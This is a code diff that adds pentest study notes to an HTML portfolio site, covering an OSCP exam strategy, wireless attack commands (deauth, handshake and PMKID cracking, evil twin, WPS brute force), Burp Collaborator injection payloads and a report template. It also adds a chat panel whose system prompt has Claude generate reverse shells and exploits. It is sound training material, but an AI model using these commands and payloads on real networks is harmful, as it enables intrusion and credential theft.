+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    for i in range(50):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)</pre></div>
+      <h2>Burp Collaborator Payload</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Use Burp Collaborator URL in:</span>
+<span class="n-cm"># - SSRF testing: URL fields, XML ENTITY, img src</span>
+<span class="n-cm"># - XXE OOB: &lt;!ENTITY xxe SYSTEM "http://COLLAB.burpcollaborator.net/"&gt;</span>
+<span class="n-cm"># - Blind SQLi: LOAD_FILE('\\\\COLLAB\\x')</span>
+<span class="n-cm"># - Email header injection: CC: attacker@COLLAB</span>
+
+<span class="n-cm"># Check interactions in Burp → Collaborator client</span></pre></div>
+    </div>
+
+    <!-- ═══ EXTRA: OSCP TIPS ═══ -->
+    <div id="n-sec-extra-oscp" class="n-section">
+      <div class="n-copyright-strip"><span>📋</span><span><strong>© Darckshad4w</strong> — Extra Notes: OSCP Exam Tips</span></div>
+      <div class="n-page-title">📋 OSCP <span class="hl">Exam Tips</span></div>
+      <div class="n-page-sub">Strategy, methodology, and time management for the OSCP exam</div>
+      <div class="n-info-box note"><strong>📌 OSCP Format (2024+)</strong>6 machines: 3 standalone + 1 AD set (DC + 2 clients). Max 100 pts: 20 per standalone, 40 for full AD chain. Need 70 to pass. 24hr exam + 24hr report.</div>
+      <h2>Time Management</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Time</th><th>Action</th></tr>
+        <tr><td>0:00</td><td>Start AD set — highest value (40 pts), chain required</td></tr>
+        <tr><td>0:00–4:00</td><td>Enumerate all machines simultaneously with nmap</td></tr>
+        <tr><td>4:00–8:00</td><td>Foothold on AD + 1-2 standalones</td></tr>
+        <tr><td>8:00–16:00</td><td>PrivEsc on secured machines, lateral AD movement</td></tr>
+        <tr><td>16:00–20:00</td><td>Complete AD chain to DC, finish remaining standalones</td></tr>
+        <tr><td>20:00–24:00</td><td>Document everything, screenshots, proof.txt</td></tr>
+      </table></div>
+      <h2>Must-Do On Every Machine</h2>
+      <ul class="n-checklist">
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Screenshot: <code>hostname</code>, <code>whoami</code>, <code>ipconfig/ifconfig</code></li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Screenshot: <code>local.txt</code> / <code>proof.txt</code> content WITH hostname</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Note all open ports and services found</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Document exact commands used for exploitation</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Note credentials found — try on other machines</li>
+        <li><span class="n-chk" onclick="nToggleCheck(this,this.parentElement)"></span>Check for password reuse across all targets</li>
+      </ul>
+      <h2>Enumeration Order</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># 1. Fast full port scan (run first, let it run in background)</span>
+nmap -p- --min-rate 5000 -oA fullscan TARGET &
+
+<span class="n-cm"># 2. Service version scan on found ports</span>
+nmap -sV -sC -p PORT1,PORT2 TARGET -oA services
+
+<span class="n-cm"># 3. Web (if 80/443/8080)</span>
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html &
+nikto -h http://TARGET
+
+<span class="n-cm"># 4. SMB (if 445)</span>
+enum4linux -a TARGET; smbmap -H TARGET
+
+<span class="n-cm"># 5. searchsploit for detected versions</span>
+searchsploit "Apache 2.4.49"</pre></div>
+      <h2>When You're Stuck</h2>
+      <div class="n-info-box info"><strong>💡 Unstuck Strategy</strong>
+1. Re-enumerate — you missed something. Run gobuster with different wordlists.
+2. Check version numbers more carefully — searchsploit every service.
+3. Read all source code, comments, and config files found.
+4. Try harder on password reuse — spray found creds everywhere.
+5. Move to another machine and come back fresh.
+6. Check for non-standard ports (8443, 8888, 3000, etc.).</div>
+      <h2>Report Must-Haves</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Section</th><th>Required Content</th></tr>
+        <tr><td>Executive Summary</td><td>Brief overview, scope, overall risk</td></tr>
+        <tr><td>Per Machine</td><td>IP, OS, open ports, vulnerabilities found</td></tr>
+        <tr><td>Exploitation</td><td>Step-by-step with all exact commands</td></tr>
+        <tr><td>Screenshots</td><td>Every step + proof.txt with IP/hostname visible</td></tr>
+        <tr><td>Remediation</td><td>Patching advice for each finding</td></tr>
+      </table></div>
+    </div>
+
+    <!-- ═══ EXTRA: WIRELESS ═══ -->
+    <div id="n-sec-extra-wireless" class="n-section">
+      <div class="n-copyright-strip"><span>📡</span><span><strong>© Darckshad4w</strong> — Extra Notes: Wireless Attacks (CWAP)</span></div>
+      <div class="n-page-title">📡 <span class="hl">Wireless Attacks</span></div>
+      <div class="n-page-sub">Wi-Fi hacking, WPA2 cracking, and rogue AP techniques — CWAP reference</div>
+      <div class="n-info-box tip"><strong>💡 Legal Note</strong>Only test networks you own or have explicit written authorization to test. Wireless attacks without authorization are illegal in most jurisdictions.</div>
+      <h2>Setup &amp; Monitor Mode</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>iwconfig                                  <span class="n-cm"># Check wireless interfaces</span>
+airmon-ng check kill                      <span class="n-cm"># Kill interfering processes</span>
+airmon-ng start wlan0                     <span class="n-cm"># Enable monitor mode → wlan0mon</span>
+iwconfig wlan0mon                         <span class="n-cm"># Verify monitor mode</span>
+airodump-ng wlan0mon                      <span class="n-cm"># Discover nearby APs</span>
+airmon-ng stop wlan0mon                   <span class="n-cm"># Return to managed mode</span></pre></div>
+      <h2>WPA2 Handshake Capture</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Target specific AP and channel</span>
+airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon
+
+<span class="n-cm"># Force deauth to capture handshake (in another terminal)</span>
+aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
+
+<span class="n-cm"># Crack the captured handshake</span>
+aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 capture.hccapx rockyou.txt</pre></div>
+      <h2>PMKID Attack (No Clients Needed)</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
+hcxpcapngtool -o hash.22000 pmkid.pcapng
+hashcat -m 22000 hash.22000 rockyou.txt</pre></div>
+      <h2>Evil Twin / Rogue AP</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Using hostapd-wpe (WPA Enterprise attack)</span>
+hostapd-wpe hostapd-wpe.conf
+
+<span class="n-cm"># Using airbase-ng (open evil twin)</span>
+airbase-ng -a AP_MAC --essid "TargetSSID" -c CHANNEL wlan0mon
+
+<span class="n-cm"># Using Wifiphisher (automated)</span>
+wifiphisher -aI wlan0 -jI wlan1 --essid "TargetSSID"</pre></div>
+      <h2>WPS Attack</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>wash -i wlan0mon                           <span class="n-cm"># Scan for WPS-enabled APs</span>
+reaver -i wlan0mon -b AP_MAC -vv          <span class="n-cm"># WPS PIN brute-force</span>
+bully wlan0mon -b AP_MAC -d -v 3          <span class="n-cm"># Alternative to reaver</span></pre></div>
+      <h2>802.11 Frame Types (CWAP Reference)</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Type</th><th>Subtype</th><th>Purpose</th></tr>
+        <tr><td>Management</td><td>Beacon</td><td>AP advertises SSID/capabilities</td></tr>
+        <tr><td>Management</td><td>Probe Req/Resp</td><td>Station discovers APs</td></tr>
+        <tr><td>Management</td><td>Auth/Assoc</td><td>Connection establishment</td></tr>
+        <tr><td>Management</td><td>Deauth/Disassoc</td><td>Disconnect (abused for attacks)</td></tr>
+        <tr><td>Control</td><td>RTS/CTS</td><td>Medium access coordination</td></tr>
+        <tr><td>Control</td><td>ACK</td><td>Frame acknowledgment</td></tr>
+        <tr><td>Data</td><td>Data/QoS Data</td><td>Actual user traffic</td></tr>
+      </table></div>
+    </div>
+
+    <!-- ═══ EXTRA: REPORT TEMPLATE ═══ -->
+    <div id="n-sec-extra-report" class="n-section">
+      <div class="n-copyright-strip"><span>📝</span><span><strong>© Darckshad4w</strong> — Extra Notes: Pentest Report Template</span></div>
+      <div class="n-page-title">📝 Pentest <span class="hl">Report Template</span></div>
+      <div class="n-page-sub">Professional penetration test report structure and finding template</div>
+      <h2>Report Structure</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Section</th><th>Content</th></tr>
+        <tr><td>1. Cover Page</td><td>Client name, date, classification, tester name/contact</td></tr>
+        <tr><td>2. Executive Summary</td><td>Non-technical overview, overall risk rating, key recommendations</td></tr>
+        <tr><td>3. Scope &amp; Rules</td><td>IP ranges, out-of-scope, testing window, authorization reference</td></tr>
+        <tr><td>4. Methodology</td><td>Framework used (PTES, OWASP, NIST), phases, tools overview</td></tr>
+        <tr><td>5. Findings Summary</td><td>Table of all findings with severity, CVSS, affected host</td></tr>
+        <tr><td>6. Detailed Findings</td><td>Full technical detail for each finding (see template below)</td></tr>
+        <tr><td>7. Recommendations</td><td>Prioritized remediation roadmap</td></tr>
+        <tr><td>8. Appendix</td><td>Raw nmap output, full command logs, evidence screenshots</td></tr>
+      </table></div>
+      <h2>Finding Template</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">markdown</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>## Finding: [Short Title]
+
+**Severity:** Critical / High / Medium / Low / Informational
+**CVSS Score:** X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+**Affected Host(s):** 192.168.1.10 (web01.corp.local)
+**Affected Service:** HTTP / Port 80
+
+### Description
+[Clear explanation of the vulnerability and why it exists]
+
+### Evidence
+[Screenshot, command output, or PoC]
+- Command: `sqlmap -u "http://target/?id=1" --dbs`
+- Result: Database dumped — [screenshot]
+
+### Business Impact
+[What an attacker could do, data at risk, regulatory implications]
+
+### Remediation
+1. [Specific patch/fix step]
+2. [Configuration change]
+3. [Workaround if patch unavailable]
+
+### References
+- CVE-XXXX-XXXXX
+- https://owasp.org/www-project-top-ten/</pre></div>
+      <h2>CVSS v3.1 Quick Reference</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Score</th><th>Severity</th><th>Action</th></tr>
+        <tr><td>9.0 – 10.0</td><td style="color:#ff3a6e">Critical</td><td>Patch immediately — emergency change</td></tr>
+        <tr><td>7.0 – 8.9</td><td style="color:#ffa502">High</td><td>Patch within 7-14 days</td></tr>
+        <tr><td>4.0 – 6.9</td><td style="color:#ffd93d">Medium</td><td>Patch within 30 days</td></tr>
+        <tr><td>0.1 – 3.9</td><td style="color:#2ed573">Low</td><td>Patch within 90 days</td></tr>
+        <tr><td>0.0</td><td style="color:#445070">Info</td><td>Best-practice recommendation</td></tr>
+      </table></div>
+    </div>
+
+  </div><!-- /n-content -->
+</main>
+
+<!-- AI Panel -->
+<div id="n-ai-panel">
+  <div class="n-ai-panel-header">
+    <div class="n-ai-panel-title">🤖 AI Assistant <span class="n-ai-model-tag">Claude</span></div>
+    <button class="n-ai-close" onclick="nToggleAI()">✕</button>
+  </div>
+  <div class="n-ai-messages" id="n-ai-messages">
+    <div class="n-ai-msg bot">
+      <div class="n-ai-msg-label">DARKSHAD4W AI</div>
+      Hey! 👋 I'm your hacking assistant. Ask me anything:<br><br>
+      • Explain a technique or CVE<br>
+      • Generate a custom payload<br>
+      • Decode/analyze data<br>
+      • Help plan an attack path<br>
+      • Explain any command in these notes
+    </div>
+  </div>
+  <div class="n-ai-quick-prompts">
+    <button class="n-quick-btn" onclick="nQuickPrompt('Explain Kerberoasting step by step')">Kerberoasting</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('Give me a Python3 reverse shell one-liner')">Rev Shell</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('What is PwnKit (CVE-2021-4034) and how does it work?')">PwnKit</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('How do I escape a Docker container?')">Docker Escape</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('What are the best tools for Active Directory enumeration?')">AD Enum</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('Explain Golden Ticket attack step by step')">Golden Ticket</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('Give me a Mimikatz command to dump all domain hashes via DCSync')">DCSync</button>
+    <button class="n-quick-btn" onclick="nQuickPrompt('How do I crack WPA2 with PMKID attack?')">WPA2 PMKID</button>
+  </div>
+  <div class="n-ai-input-row">
+    <textarea id="n-ai-input" placeholder="Ask anything about hacking, exploits, payloads..." rows="1"
+      onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();nSendAI();}"
+      oninput="this.style.height='auto';this.style.height=this.scrollHeight+'px'"></textarea>
+    <button class="n-ai-send" id="n-ai-send-btn" onclick="nSendAI()">➤</button>
+  </div>
+</div>
+
+<button id="n-ai-toggle" onclick="nToggleAI()" title="AI Assistant">
+  🤖<span class="n-ai-toggle-badge">AI</span>
+</button>
+<button id="n-menu-toggle" onclick="nToggleSidebar()">☰</button>
+
+</div><!-- /page-notes -->
+
 <script>
-  // Custom cursor
-  const cursor = document.getElementById('cursor');
-  const ring = document.getElementById('cursor-ring');
-  let mx=0,my=0,rx=0,ry=0;
-  document.addEventListener('mousemove', e => {
-    mx=e.clientX; my=e.clientY;
-    cursor.style.left=mx+'px'; cursor.style.top=my+'px';
+// ══════════ PAGE SWITCHER ══════════
+function switchTab(tab) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('page-' + tab).classList.add('active');
+  const btns = document.querySelectorAll('.tab-btn');
+  btns.forEach(b => { if (b.textContent.includes(tab === 'portfolio' ? 'Portfolio' : 'Notes')) b.classList.add('active'); });
+  window.scrollTo(0, 0);
+}
+
+// ══════════ PORTFOLIO JS ══════════
+const cursor = document.getElementById('cursor');
+const ring = document.getElementById('cursor-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove', e => {
+  mx=e.clientX; my=e.clientY;
+  if (cursor) { cursor.style.left=mx+'px'; cursor.style.top=my+'px'; }
+});
+(function animRing(){
+  rx+=(mx-rx)*.12; ry+=(my-ry)*.12;
+  if (ring) { ring.style.left=rx+'px'; ring.style.top=ry+'px'; }
+  requestAnimationFrame(animRing);
+})();
+document.querySelectorAll('a,button,.exp-card,.cert-card,.edu-card,.contact-item').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{ if(cursor){cursor.style.width='20px';cursor.style.height='20px';} if(ring){ring.style.width='56px';ring.style.height='56px';} });
+  el.addEventListener('mouseleave',()=>{ if(cursor){cursor.style.width='12px';cursor.style.height='12px';} if(ring){ring.style.width='36px';ring.style.height='36px';} });
+});
+
+const revObserver = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.classList.add('visible');
+      e.target.querySelectorAll('.skill-fill').forEach(b=>b.classList.add('visible'));
+    }
   });
-  (function animRing(){
-    rx+=(mx-rx)*.12; ry+=(my-ry)*.12;
-    ring.style.left=rx+'px'; ring.style.top=ry+'px';
-    requestAnimationFrame(animRing);
-  })();
-  document.querySelectorAll('a,button,.exp-card,.cert-card,.edu-card,.contact-item').forEach(el=>{
-    el.addEventListener('mouseenter',()=>{ cursor.style.width='20px'; cursor.style.height='20px'; ring.style.width='56px'; ring.style.height='56px'; });
-    el.addEventListener('mouseleave',()=>{ cursor.style.width='12px'; cursor.style.height='12px'; ring.style.width='36px'; ring.style.height='36px'; });
-  });
+},{threshold:.12});
+document.querySelectorAll('.reveal').forEach(el=>revObserver.observe(el));
 
-  // Scroll reveal + skill bars
-  const revObserver = new IntersectionObserver(entries=>{
-    entries.forEach(e=>{
-      if(e.isIntersecting){
-        e.target.classList.add('visible');
-        e.target.querySelectorAll('.skill-fill').forEach(b=>b.classList.add('visible'));
-      }
-    });
-  },{threshold:.12});
-  document.querySelectorAll('.reveal').forEach(el=>revObserver.observe(el));
+const skillObs = new IntersectionObserver(entries=>{
+  if(entries[0].isIntersecting) document.querySelectorAll('.skill-fill').forEach(b=>b.classList.add('visible'));
+},{threshold:.1});
+const skillSec = document.getElementById('skills');
+if(skillSec) skillObs.observe(skillSec);
 
-  const skillObs = new IntersectionObserver(entries=>{
-    if(entries[0].isIntersecting) document.querySelectorAll('.skill-fill').forEach(b=>b.classList.add('visible'));
-  },{threshold:.1});
-  const skillSec = document.getElementById('skills');
-  if(skillSec) skillObs.observe(skillSec);
+const eyebrow = document.querySelector('.hero-eyebrow');
+if(eyebrow){
+  const orig=eyebrow.innerHTML; eyebrow.innerHTML=''; let i=0;
+  setTimeout(()=>{ const iv=setInterval(()=>{ eyebrow.innerHTML=orig.substring(0,i++); if(i>orig.length) clearInterval(iv); },30); },700);
+}
 
-  // Typing effect
-  const eyebrow = document.querySelector('.hero-eyebrow');
-  if(eyebrow){
-    const orig=eyebrow.innerHTML; eyebrow.innerHTML=''; let i=0;
-    setTimeout(()=>{
-      const iv=setInterval(()=>{ eyebrow.innerHTML=orig.substring(0,i++); if(i>orig.length) clearInterval(iv); },30);
-    },700);
+// ══════════ H4CK NOTES JS ══════════
+function nShowSection(id) {
+  document.querySelectorAll('.n-section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.n-nav-item').forEach(n => n.classList.remove('active'));
+  const sec = document.getElementById('n-sec-' + id);
+  if (sec) { sec.classList.add('active'); window.scrollTo(0,0); }
+  const item = [...document.querySelectorAll('.n-nav-item')].find(n => n.getAttribute('onclick') === `nShowSection('${id}')`);
+  if (item) {
+    item.classList.add('active');
+    const lbl = item.textContent.replace('↳ ','').replace('🏠 ','').replace('🤖 ','').split('\n')[0].trim();
+    document.getElementById('n-breadcrumb-label').textContent = lbl;
   }
+  if (window.innerWidth <= 768) document.getElementById('n-sidebar').classList.remove('open');
+}
 
-  // Active nav
-  const secs=document.querySelectorAll('[id]');
-  const links=document.querySelectorAll('.nav-links a');
-  window.addEventListener('scroll',()=>{
-    let cur='';
-    secs.forEach(s=>{ if(window.scrollY>=s.offsetTop-100) cur=s.id; });
-    links.forEach(a=>{ a.style.color=a.getAttribute('href')==='#'+cur?'var(--accent)':''; });
-  },{passive:true});
+function nCopyCode(btn) {
+  const pre = btn.closest('.n-code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = '✓ done'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function nToggleCheck(chk, li) {
+  chk.classList.toggle('done');
+  chk.textContent = chk.classList.contains('done') ? '✓' : '';
+  li.classList.toggle('done-item', chk.classList.contains('done'));
+  nUpdateProgress();
+}
+
+function nUpdateProgress() {
+  const all = document.querySelectorAll('.n-chk');
+  const done = document.querySelectorAll('.n-chk.done');
+  const pct = all.length ? Math.round((done.length / all.length) * 100) : 0;
+  document.getElementById('n-prog-fill').style.width = pct + '%';
+  document.getElementById('n-prog-pct').textContent = pct + '%';
+}
+
+function nFilterNav(q) {
+  q = q.toLowerCase().trim();
+  document.querySelectorAll('.n-nav-item').forEach(item => {
+    item.style.display = !q || item.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+  document.querySelectorAll('.n-nav-section').forEach(sec => {
+    const visible = [...sec.querySelectorAll('.n-nav-item')].some(i => i.style.display !== 'none');
+    sec.style.display = visible ? '' : 'none';
+  });
+}
+
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k' && document.getElementById('page-notes').classList.contains('active')) {
+    e.preventDefault();
+    document.getElementById('n-search-input').focus();
+  }
+  if (e.key === 'Escape') {
+    const inp = document.getElementById('n-search-input');
+    if (inp) { inp.value = ''; nFilterNav(''); }
+  }
+});
+
+function nToggleSidebar() {
+  document.getElementById('n-sidebar').classList.toggle('open');
+}
+
+// ══════════ NOTES AI PANEL ══════════
+let nAiOpen = false;
+
+function nToggleAI() {
+  nAiOpen = !nAiOpen;
+  document.getElementById('n-ai-panel').classList.toggle('open', nAiOpen);
+  const btn = document.getElementById('n-ai-toggle');
+  btn.innerHTML = nAiOpen ? '✕' : '🤖<span class="n-ai-toggle-badge">AI</span>';
+  if (nAiOpen) document.getElementById('n-ai-input').focus();
+}
+
+function nAppendMsg(text, role) {
+  const wrap = document.getElementById('n-ai-messages');
+  const div = document.createElement('div');
+  div.className = 'n-ai-msg ' + role;
+  div.innerHTML = `<div class="n-ai-msg-label">${role==='bot'?'DARKSHAD4W AI':'YOU'}</div>${nFormatMsg(text)}`;
+  wrap.appendChild(div);
+  wrap.scrollTop = wrap.scrollHeight;
+  return div;
+}
+
+function nFormatMsg(text) {
+  return text.replace(/`([^`]+)`/g,'<code>$1</code>').replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>').replace(/\n/g,'<br>');
+}
+
+function nShowThinking() {
+  const wrap = document.getElementById('n-ai-messages');
+  const div = document.createElement('div');
+  div.className = 'n-ai-msg bot'; div.id = 'n-ai-thinking';
+  div.innerHTML = '<div class="n-ai-msg-label">DARKSHAD4W AI</div><div class="n-ai-thinking"><span></span><span></span><span></span></div>';
+  wrap.appendChild(div); wrap.scrollTop = wrap.scrollHeight;
+}
+
+function nRemoveThinking() {
+  const el = document.getElementById('n-ai-thinking');
+  if (el) el.remove();
+}
+
+async function nQuickPrompt(prompt) {
+  if (!nAiOpen) nToggleAI();
+  document.getElementById('n-ai-input').value = prompt;
+  await nSendAI();
+}
+
+async function nSendAI() {
+  const input = document.getElementById('n-ai-input');
+  const text = input.value.trim();
+  if (!text) return;
+  input.value = ''; input.style.height = 'auto';
+  document.getElementById('n-ai-send-btn').disabled = true;
+  nAppendMsg(text, 'user');
+  nShowThinking();
+  const messages = [];
+  document.querySelectorAll('#n-ai-messages .n-ai-msg').forEach(el => {
+    if (el.id === 'n-ai-thinking') return;
+    const isBot = el.classList.contains('bot');
+    const label = el.querySelector('.n-ai-msg-label');
+    let content = el.innerHTML;
+    if (label) content = content.replace(label.outerHTML, '');
+    content = content.replace(/<br>/g,'\n').replace(/<[^>]+>/g,'').replace(/\\n/g,'\n').trim();
+    messages.push({ role: isBot ? 'assistant' : 'user', content });
+  });
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: `You are an expert offensive security assistant embedded inside "Darckshad4w H4CK Notes" — a cybersecurity study reference tool owned and created by Darckshad4w (Rifdhy RM), a professional penetration tester and red teamer from Sri Lanka. You help with:
+- Explaining hacking techniques, CVEs, and attack vectors
+- Generating payloads, reverse shells, and exploitation scripts
+- Analyzing logs, code, and security configurations
+- Helping plan attack paths and privilege escalation
+- Decoding/encoding data (base64, hex, JWT, etc.)
+- Answering CTF and OSCP-style questions
+- Mimikatz, BloodHound, Active Directory attacks
+- Wireless security and CWAP-level concepts
+
+Be concise, technical, and practical. Use code blocks with backticks when showing commands. You are assisting an authorized security researcher/student.`,
+        messages
+      })
+    });
+    nRemoveThinking();
+    if (!res.ok) {
+      const err = await res.json().catch(()=>({}));
+      nAppendMsg(`⚠️ API Error: ${err.error?.message || res.statusText}\n\nUse this inside Claude.ai where the API key is handled automatically.`, 'bot');
+    } else {
+      const data = await res.json();
+      const reply = data.content?.map(c => c.text || '').join('') || 'No response received.';
+      nAppendMsg(reply, 'bot');
+    }
+  } catch (err) {
+    nRemoveThinking();
+    nAppendMsg(`⚠️ Error: ${err.message}`, 'bot');
+  } finally {
+    document.getElementById('n-ai-send-btn').disabled = false;
+  }
+}
 </script>
 </body>
 </html>
